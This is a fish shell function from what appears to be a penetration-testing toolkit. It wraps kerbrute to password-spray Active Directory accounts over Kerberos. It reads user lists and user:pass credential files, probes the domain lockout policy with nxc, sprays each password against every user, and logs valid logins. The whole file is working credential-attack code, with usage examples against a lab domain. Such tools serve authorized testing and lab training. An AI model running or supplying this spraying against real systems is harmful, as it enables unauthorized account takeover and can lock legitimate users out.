function _ezpz_credspray
    source $EZPZ_HOME/functions/_ezpz_colors.fish

    ezpz_banner credspray

    # Usage message
    set usage "
Usage: ezpz credspray -t <target> -d <domain> [options]

  Password spraying via Kerberos (kerbrute) against Active Directory.

  Two workflows are supported:
    1. Spray known password(s) against a user list.
    2. Hail mary: read a user:pass creds file and spray every unique password
       against every known user, optionally also trying username-as-password.

  Required:
    -t, --target       Domain Controller IP or hostname
    -d, --domain       Full AD domain (e.g. north.sevenkingdoms.local)

  Credential sources (need at least one user source and one password source):
    -u, --usersfile    File with usernames, one per line. Comments (#) and
                       DOMAIN\\user / user@domain prefixes are handled.
    -p, --password     Single password, or a file with one password per line.
                       If the value is not an existing file it is treated as
                       a literal password.
    -c, --credsfile    File with user:pass lines. Usernames and passwords are
                       extracted automatically. NT hashes (32 hex chars) are
                       skipped; use testcreds/nxc for pass-the-hash.

  Spray options:
    --user-as-pass     Also spray each username as its own password
    --safe             Abort if kerbrute detects a locked-out account
    --delay <ms>       Delay between attempts in milliseconds (single thread)
    --threads <n>      Number of kerbrute threads (kerbrute default: 10)
    -v, --verbose      Show failed attempts and kerbrute errors
    -F, --force        Bypass the lockout-threshold guard

  Lockout safety:
    Before spraying, the wrapper queries the domain password policy with the
    first usable credential. If the number of attempts per user (passwords +
    username-as-pass) reaches the lockout threshold, it refuses to continue.
    A failed policy probe also counts as one attempt for that user. Use
    --force only when you understand the risk. With --safe, kerbrute aborts
    as soon as it sees a locked account.

Examples:
  # One password against a user list
  ezpz credspray -t 10.10.0.11 -d north.sevenkingdoms.local \\
      -u users.txt -p 'Winter2024'

  # A file with candidate passwords
  ezpz credspray -t 10.10.0.11 -d north.sevenkingdoms.local \\
      -u users.txt -p passwords.txt --safe --delay 1000

  # Hail mary: users and passwords come from creds.txt
  ezpz credspray -t 10.10.0.11 -d north.sevenkingdoms.local \\
      -c creds.txt --safe --delay 1000

  # Hail mary plus an extra user list and username-as-password
  ezpz credspray -t 10.10.0.11 -d north.sevenkingdoms.local \\
      -c creds.txt -u users.txt --user-as-pass --safe --delay 1000
"

    # Parse arguments
    argparse 't/target=' 'u/usersfile=' 'p/password=' 'c/credsfile=' 'd/domain=' \
        'F/force' 'user-as-pass' 'safe' 'delay=' 'threads=' 'v/verbose' 'h/help' -- $argv
    or begin
        ezpz_error "Failed to parse arguments."
        echo $usage
        return 1
    end

    if set -q _flag_help
        echo $usage
        return 0
    end

    # Validate required arguments
    if not set -q _flag_target
        ezpz_error "Missing target."
        echo $usage
        return 1
    end

    if not set -q _flag_domain
        ezpz_error "Missing domain."
        echo $usage
        return 1
    end

    if set -q _flag_delay; and not string match -qr '^[0-9]+$' -- $_flag_delay
        ezpz_error "Invalid --delay value '$_flag_delay' (expected milliseconds as an integer)."
        return 1
    end

    if set -q _flag_threads; and not string match -qr '^[1-9][0-9]*$' -- $_flag_threads
        ezpz_error "Invalid --threads value '$_flag_threads' (expected a positive integer)."
        return 1
    end

    if not command -v kerbrute >/dev/null 2>&1
        ezpz_error "Required tool not found: kerbrute"
        return 1
    end

    # Collect users and passwords. -c is parsed first so its first usable
    # credential can be used for the lockout-policy probe.
    set -l users
    set -l passwords
    set -l skipped_hashes 0
    set -l first_user ""
    set -l first_pass ""

    if set -q _flag_usersfile
        if not test -f $_flag_usersfile
            ezpz_error "Usersfile '$_flag_usersfile' not found."
            return 1
        end

        while read -l line
            set line (string trim -- $line)
            test -z "$line"; and continue
            string match -q '#*' -- $line; and continue

            # Accept DOMAIN\user, DOMAIN/user and user@domain forms.
            set line (string replace -r '^[^\\/]+[\\/]' '' -- $line)
            set line (string replace -r '@.*$' '' -- $line)
            test -z "$line"; and continue

            contains -- $line $users; or set -a users $line
        end < $_flag_usersfile
    end

    if set -q _flag_credsfile
        if not test -f $_flag_credsfile
            ezpz_error "Credsfile '$_flag_credsfile' not found."
            return 1
        end

        while read -l line
            set line (string trim -- $line)
            test -z "$line"; and continue
            string match -q '#*' -- $line; and continue

            set -l parts (string split -m1 : $line)
            test (count $parts) -ge 2; or continue

            set -l cuser $parts[1]
            set -l cpass $parts[2]
            set cuser (string replace -r '^[^\\/]+[\\/]' '' -- $cuser)
            set cuser (string replace -r '@.*$' '' -- $cuser)

            if test -n "$cuser"
                contains -- $cuser $users; or set -a users $cuser
            end

            if string match -qr '^[a-fA-F0-9]{32}$' -- $cpass
                # NT hashes cannot be used by Kerberos pre-auth spraying.
                set skipped_hashes (math $skipped_hashes + 1)
                continue
            end

            if test -n "$cuser" -a -z "$first_user"
                set first_user $cuser
                set first_pass $cpass
            end

            if test -n "$cpass"
                contains -- $cpass $passwords; or set -a passwords $cpass
            end
        end < $_flag_credsfile
    end

    if set -q _flag_password
        if test -f $_flag_password
            while read -l line
                set line (string trim -- $line)
                test -z "$line"; and continue
                string match -q '#*' -- $line; and continue

                if string match -qr '^[a-fA-F0-9]{32}$' -- $line
                    set skipped_hashes (math $skipped_hashes + 1)
                    continue
                end

                contains -- $line $passwords; or set -a passwords $line
            end < $_flag_password
        else if test -n "$_flag_password"
            if string match -qr '^[a-fA-F0-9]{32}$' -- $_flag_password
                set skipped_hashes (math $skipped_hashes + 1)
            else
                contains -- $_flag_password $passwords; or set -a passwords $_flag_password
            end
        end
    end

    if test (count $users) -eq 0
        ezpz_error "No usernames found. Provide -u or a -c file with user:pass lines."
        echo $usage
        return 1
    end

    if test $skipped_hashes -gt 0
        ezpz_warn "Skipped $skipped_hashes NT hash(es); kerbrute only supports passwords."
        ezpz_info "Use testcreds/nxc with -H for pass-the-hash."
    end

    if test (count $passwords) -eq 0; and not set -q _flag_user_as_pass
        ezpz_error "No passwords found. Provide -p, a -c file with passwords, or use --user-as-pass."
        echo $usage
        return 1
    end

    # Probe credential: prefer the first user:pass line from -c, then the
    # first user with the first password, then the first user for user-as-pass.
    if test -z "$first_user"
        set first_user $users[1]
        if test (count $passwords) -gt 0
            set first_pass $passwords[1]
        else if set -q _flag_user_as_pass
            set first_pass $users[1]
        end
    end
    if test -z "$first_pass"; and set -q _flag_user_as_pass
        set first_pass $first_user
    end

    # Lockout safety: how many attempts will each user receive?
    set -l total_attempts (count $passwords)
    if set -q _flag_user_as_pass
        set total_attempts (math $total_attempts + 1)
    end

    set -l guard_attempts $total_attempts
    if test $total_attempts -gt 0
        if set -q _flag_force
            ezpz_warn "Lockout guard bypassed with --force."
        else if test -n "$first_user"
            set -l policy (timeout 30 nxc smb $_flag_target -u "$_flag_domain\\$first_user" -p "$first_pass" --pass-pol 2>/dev/null)
            set -l policy_status $status
            if test $policy_status -eq 124
                ezpz_warn "Password policy probe timed out; lockout threshold is unknown."
            else
                set -l threshold (printf '%s\n' $policy | grep -aoE 'Account Lockout Threshold: [0-9]+' | grep -oE '[0-9]+$' | head -1)

                if not string match -qr '\[\+\]' -- $policy
                    # The probe consumed one attempt for this user.
                    set guard_attempts (math $guard_attempts + 1)
                end

                if test -n "$threshold"
                    if test $threshold -gt 0 -a $guard_attempts -ge $threshold
                        ezpz_error "Lockout guard: $guard_attempts attempt(s) per user against a threshold of $threshold."
                        ezpz_warn "This would lock accounts. Reduce the password list or use --force to override."
                        return 1
                    end
                    ezpz_info "Lockout policy: threshold $threshold, $guard_attempts attempt(s) per user."
                else
                    ezpz_warn "Could not read the lockout threshold; use --safe and --delay if unsure."
                end
            end
        else
            ezpz_warn "No probe credential available; lockout threshold is unknown."
        end
    end

    if test $total_attempts -gt 1; and not set -q _flag_safe; and not set -q _flag_delay
        ezpz_warn "Multiple attempts per user without --safe or --delay. Consider adding them."
    end

    # Build the kerbrute base command (without the password/positional user file).
    set -l kb passwordspray
    set -a kb --dc $_flag_target
    set -a kb -d $_flag_domain
    if set -q _flag_safe
        set -a kb --safe
    end
    if set -q _flag_delay
        set -a kb --delay $_flag_delay
    end
    if set -q _flag_threads
        set -a kb -t $_flag_threads
    end
    if set -q _flag_verbose
        set -a kb -v
    end

    # Temporary files
    set -l users_tmp (mktemp)
    set -l run_tmp (mktemp)
    set -l valid_tmp (mktemp)
    trap 'rm -f "$users_tmp" "$run_tmp" "$valid_tmp"' EXIT TERM INT
    printf '%s\n' $users > $users_tmp
    printf '' > $valid_tmp

    ezpz_header "Spray summary"
    ezpz_info "Target: $_flag_target"
    ezpz_info "Domain: $_flag_domain"
    ezpz_info "Users: "(count $users)
    ezpz_info "Passwords: "(count $passwords)
    if set -q _flag_user_as_pass
        ezpz_info "Username-as-password: enabled"
    end

    set -l aborted false

    if set -q _flag_user_as_pass
        ezpz_info "Testing username as password"
        ezpz_cmd "kerbrute $kb $users_tmp --user-as-pass"

        if set -q _flag_verbose
            kerbrute $kb $users_tmp --user-as-pass 2>&1 | tee $run_tmp | sed -E 's/\x1B\[[0-9;]*[A-Za-z]//g'
        else
            kerbrute $kb $users_tmp --user-as-pass 2>&1 | tee $run_tmp | grep -aEi 'VALID LOGIN|ABORT|locked|error' | sed -E 's/\x1B\[[0-9;]*[A-Za-z]//g'
        end
        set -l rc $pipestatus[1]
        grep -aiE 'VALID LOGIN' $run_tmp | sed -E 's/\x1B\[[0-9;]*[A-Za-z]//g' >> $valid_tmp

        if grep -aqiE 'locked|abort' $run_tmp
            ezpz_error "kerbrute aborted because an account is locked. Stopping."
            set aborted true
        else if test $rc -ne 0
            ezpz_warn "kerbrute exited with status $rc. Stopping."
            set aborted true
        end
    end

    for password in $passwords
        test $aborted = true; and break

        ezpz_info "Testing password: $password"
        ezpz_cmd "kerbrute $kb $users_tmp <PASSWORD>"

        if set -q _flag_verbose
            kerbrute $kb $users_tmp $password 2>&1 | tee $run_tmp | sed -E 's/\x1B\[[0-9;]*[A-Za-z]//g'
        else
            kerbrute $kb $users_tmp $password 2>&1 | tee $run_tmp | grep -aEi 'VALID LOGIN|ABORT|locked|error' | sed -E 's/\x1B\[[0-9;]*[A-Za-z]//g'
        end
        set -l rc $pipestatus[1]
        grep -aiE 'VALID LOGIN' $run_tmp | sed -E 's/\x1B\[[0-9;]*[A-Za-z]//g' >> $valid_tmp

        if grep -aqiE 'locked|abort' $run_tmp
            ezpz_error "kerbrute aborted because an account is locked. Stopping."
            set aborted true
        else if test $rc -ne 0
            ezpz_warn "kerbrute exited with status $rc. Stopping."
            set aborted true
        end
    end

    sort -u $valid_tmp -o $valid_tmp
    set -l valid_count (count (cat $valid_tmp))

    if test $valid_count -gt 0
        ezpz_success "Valid logins found: $valid_count"
        return 0
    end

    if test $aborted = true
        ezpz_warn "Spray stopped before completing."
    else
        ezpz_warn "No valid logins found."
    end
    return 1
end
